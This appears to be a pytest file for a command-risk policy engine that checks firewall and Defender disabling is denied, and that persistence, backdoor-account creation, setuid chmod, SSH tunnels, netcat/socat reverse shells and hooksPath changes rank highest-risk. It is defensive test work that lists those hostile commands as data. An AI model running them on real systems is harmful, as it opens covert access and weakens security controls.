"""Hardening rules: security controls, persistence, privilege bits.

Roadmap section 7: no security-control disabling, no hidden persistence,
no covert remote access channels. Disable operations are denied outright;
persistence and account administration need detailed (R3) approval; the
read-only views of the same tools stay cheap.
"""

import pytest

from free_claude_code.terminal.policy import (
    PolicyConfig,
    PolicyEngine,
    Requirement,
    RiskLevel,
    classify,
)


@pytest.fixture
def engine(tmp_path):
    return PolicyEngine(PolicyConfig(workspace_root=str(tmp_path)))


def verdict_for(engine, tmp_path, *argv: str):
    from free_claude_code.terminal.spec import CommandSpec

    return engine.evaluate(CommandSpec(argv=tuple(argv), cwd=str(tmp_path)))


def test_security_control_disabling_is_denied(engine, tmp_path) -> None:
    for argv in (
        ("setenforce", "0"),
        ("setenforce", "permissive"),
        ("setenforce",),
        ("ufw", "disable"),
        ("ufw", "reset"),
        ("iptables", "-F"),
        ("iptables", "--flush"),
        ("iptables", "-X"),
        ("iptables", "-P", "INPUT", "ACCEPT"),
        ("ip6tables", "-F"),
        ("nft", "flush", "ruleset"),
        ("netsh", "advfirewall", "set", "allprofiles", "state", "off"),
        ("Set-MpPreference", "-DisableRealtimeMonitoring", "$true"),
    ):
        verdict = verdict_for(engine, tmp_path, *argv)
        assert verdict.requirement is Requirement.DENY, argv
        assert verdict.policy_id == "deny:security-control", argv


def test_security_control_denial_survives_extra_allow(engine, tmp_path) -> None:
    configured = PolicyEngine(
        PolicyConfig(workspace_root=str(tmp_path), extra_allow=frozenset({"ufw"}))
    )
    verdict = verdict_for(configured, tmp_path, "ufw", "disable")
    assert verdict.requirement is Requirement.DENY


def test_security_control_reads_and_writes_stay_classified(engine, tmp_path) -> None:
    for argv in (
        ("getenforce",),
        ("sestatus",),
        ("Get-MpPreference",),
        ("ufw", "status", "verbose"),
        ("iptables", "-L", "-n"),
        ("iptables", "-S"),
        ("nft", "list", "ruleset"),
        ("netsh", "advfirewall", "show", "allprofiles"),
    ):
        level, _ = classify(argv)
        assert level is RiskLevel.R0_READ_ONLY, argv
    for argv in (
        ("setenforce", "1"),
        ("setenforce", "enforcing"),
        ("ufw", "enable"),
        ("ufw", "allow", "22/tcp"),
        ("iptables", "-A", "INPUT", "-p", "tcp", "--dport", "22", "-j", "ACCEPT"),
        ("nft", "add", "rule", "inet", "filter", "input", "accept"),
        ("Set-MpPreference", "-ScanScheduleDay", "1"),
    ):
        level, _ = classify(argv)
        assert level is RiskLevel.R2_PRIVILEGED, argv


def test_persistence_writes_are_r3() -> None:
    for argv in (
        ("crontab", "-e"),
        ("crontab", "-r"),
        ("crontab", "myjobs.cron"),
        ("at", "now", "+", "1", "minute"),
        ("batch",),
        ("schtasks", "/create", "/tn", "x", "/tr", "y"),
        ("schtasks", "/change", "/tn", "x"),
        ("schtasks", "/delete", "/tn", "x"),
        ("launchctl", "load", "agent.plist"),
        ("launchctl", "bootstrap", "gui/501", "agent.plist"),
        ("launchctl", "bootout", "gui/501/agent"),
        ("systemctl", "enable", "worker.service"),
        ("systemctl", "disable", "worker.service"),
        ("systemctl", "mask", "worker.service"),
        ("update-rc.d", "worker", "defaults"),
        ("chkconfig", "worker", "on"),
        ("rc-update", "add", "worker", "default"),
        (
            "reg",
            "add",
            r"HKCU\Software\Microsoft\Windows\CurrentVersion\Run",
            "/v",
            "x",
        ),
        (
            "reg",
            "delete",
            r"HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce",
            "/v",
            "x",
        ),
    ):
        level, _ = classify(argv)
        assert level is RiskLevel.R3_DESTRUCTIVE, argv


def test_persistence_reads_are_r0() -> None:
    for argv in (
        ("crontab", "-l"),
        ("atq",),
        ("schtasks", "/query"),
        ("schtasks",),
        ("launchctl", "list"),
        ("launchctl", "print", "gui/501"),
        ("systemctl", "status", "worker.service"),
        ("systemctl", "is-enabled", "worker.service"),
        ("reg", "query", r"HKCU\Software\Microsoft\Windows\CurrentVersion\Run"),
    ):
        level, _ = classify(argv)
        assert level is RiskLevel.R0_READ_ONLY, argv


def test_systemctl_uninstall_verbs_keep_prior_levels() -> None:
    assert classify(("systemctl", "restart", "nginx"))[0] is RiskLevel.R2_PRIVILEGED
    assert classify(("systemctl", "stop", "nginx"))[0] is RiskLevel.R2_PRIVILEGED


def test_account_administration_is_r3() -> None:
    for argv in (
        ("useradd", "backdoor"),
        ("userdel", "backdoor"),
        ("usermod", "-aG", "sudo", "x"),
        ("passwd", "root"),
        ("passwd",),
        ("visudo",),
        ("chpasswd",),
        ("net", "user", "mallory", "/add"),
        ("net", "user", "mallory", "/delete"),
        ("net", "user", "mallory", "newpassword"),
        ("net", "localgroup", "Administrators", "mallory", "/add"),
    ):
        level, _ = classify(argv)
        assert level is RiskLevel.R3_DESTRUCTIVE, argv


def test_net_reads_are_r0() -> None:
    for argv in (
        ("net", "user"),
        ("net", "user", "mallory"),
        ("net", "localgroup", "Administrators"),
    ):
        level, _ = classify(argv)
        assert level is RiskLevel.R0_READ_ONLY, argv


def test_chmod_privilege_bits_are_r3() -> None:
    for argv in (
        ("chmod", "u+s", "/usr/bin/x"),
        ("chmod", "g+s", "dir"),
        ("chmod", "+s", "file"),
        ("chmod", "u=rwxs", "file"),
        ("chmod", "4755", "file"),
        ("chmod", "2750", "dir"),
        ("chmod", "6755", "file"),
    ):
        level, rule = classify(argv)
        assert level is RiskLevel.R3_DESTRUCTIVE, argv
        assert rule == "chmod:privilege-bits", argv


def test_chmod_ordinary_modes_stay_r1() -> None:
    for argv in (
        ("chmod", "+x", "script.sh"),
        ("chmod", "755", "script.sh"),
        ("chmod", "1777", "shared"),
        ("chmod", "u=rw,go=r", "file"),
        ("chmod", "-R", "755", "dir"),
    ):
        level, _ = classify(argv)
        assert level is RiskLevel.R1_REVERSIBLE, argv


def test_ssh_tunnels_are_r3_plain_ssh_stays_r2() -> None:
    assert classify(("ssh", "-R", "8080:localhost:22", "host"))[0] is (
        RiskLevel.R3_DESTRUCTIVE
    )
    assert classify(("ssh", "-D", "1080", "host"))[0] is RiskLevel.R3_DESTRUCTIVE
    assert classify(("ssh", "host", "uptime"))[0] is RiskLevel.R2_PRIVILEGED
    assert classify(("ssh", "-L", "8080:localhost:80", "host"))[0] is (
        RiskLevel.R2_PRIVILEGED
    )


def test_net_command_channels_are_r3() -> None:
    assert classify(("nc", "-e", "/bin/sh", "host", "4444"))[0] is (
        RiskLevel.R3_DESTRUCTIVE
    )
    assert classify(("ncat", "-c", "/bin/sh", "host", "4444"))[0] is (
        RiskLevel.R3_DESTRUCTIVE
    )
    assert classify(("socat", "-", "EXEC:/bin/sh"))[0] is RiskLevel.R3_DESTRUCTIVE
    assert classify(("nc", "-l", "-p", "8080"))[0] is RiskLevel.R2_PRIVILEGED


def test_git_hooks_path_is_r3() -> None:
    level, rule = classify(("git", "config", "core.hooksPath", "/tmp/evil"))
    assert level is RiskLevel.R3_DESTRUCTIVE
    assert rule == "git:hooks-path"
    assert classify(("git", "config", "--global", "core.hooksPath", "/tmp/evil"))[
        0
    ] is (RiskLevel.R3_DESTRUCTIVE)
    assert classify(("git", "config", "user.name", "x"))[0] is RiskLevel.R2_PRIVILEGED
